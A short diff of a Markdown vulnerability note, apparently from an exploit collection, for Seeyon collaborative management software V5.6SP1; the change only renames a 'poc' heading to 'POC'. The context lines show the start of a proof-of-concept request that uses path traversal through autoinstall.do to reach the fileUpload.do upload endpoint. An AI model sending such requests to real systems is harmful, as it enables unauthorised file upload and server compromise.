@@ -5,7 +5,7 @@
 title="协同管理软件 V5.6SP1"
 ```
 
-## poc
+## POC
 ```
 POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
 Host: your-ip
